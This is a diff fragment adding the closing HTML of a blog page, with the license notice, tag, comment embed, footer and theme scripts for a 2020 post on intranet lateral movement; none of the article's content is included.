+                <div class="license-wrapper">
+                    <p>原文作者：<a href="">Misaki</a>
+                    <p>原文链接：<a href="/2020/08/内网渗透横行移动/">/2020/08/内网渗透横行移动/</a>
+                    <p>发表日期：<a href="/2020/08/内网渗透横行移动/">August 12th 2020, 9:03:29 am</a>
+                    <p>更新日期：<a href="/2020/08/内网渗透横行移动/">August 12th 2020, 9:03:29 am</a>
+                    <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+                </div>
+              
+          <br><br>
+          <div>
+              <p>
+                       
+                      <span class="badge badge-default">#&nbsp;web安全</span>
+                      &nbsp;
+                      
+              </p>
+          </div>
+        </div>
+      </div>  
+    </div>
+  </div>
+  <!-- TOC -->
+  
+      <div class="">
+        <div id="toc">
+          <p class="toc-title"><i class="material-icons" style="vertical-align:middle">toc</i>Toc:</p> 
+          <div id="tocbot"></div>
+        </div>
+      </div>
+  
+</div>
+
+
+<!-- Comments -->
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+    
+        
+            <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script>               
+        var disqus_shortname = '';
+        var disqus_config = function () {
+            this.page.url = '/2020/08/内网渗透横行移动/'; 
+            this.page.identifier = '/2020/08/内网渗透横行移动/';
+        };
+        (function() { 
+            var d = document, s = d.createElement('script');
+            s.type = 'text/javascript';
+            s.src = '//'+disqus_shortname+'.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+</div>
+        
+    
+    </div>
+</div>
+  
+
+<footer class="footer footer-default">
+        <div class="container">
+          <div class="float-left" style="padding: 15px 0;">
+              <b>假如今天的你被生活辜负了，别伤心，因为明天生活还会继续辜负你！</b>
+          </div>
+          <div align="right" style="padding: 15px 0;">
+              <i class="iconfont icon-love" ></i>
+              <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
+          </div>
+        </div>
+</footer>
+      <!--   Core JS Files   -->
+      <script src="/js/core/jquery.min.js?v=3.2.1"></script>
+      <script src="/js/main.js"></script>
+      <script src="/js/core/popper.min.js"></script>
+      <script src="/js/core/bootstrap-material-design.min.js"></script>
+      <script src="/js/plugins/moment.min.js"></script>
+      <script src="/js/material-kit.min.js?v=2.0.5"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+        <script src="/js/post.js"></script>
+        <script src="/js/plugins/prettify.js"></script>
+        <script>
+            $(document).ready(function(){
+                $('pre').addClass('prettyprint linenums');
+                prettyPrint();
+            })
+        </script>
+      
+<script src="/live2d-widget/autoload.js"></script>
+</body>
+</html>
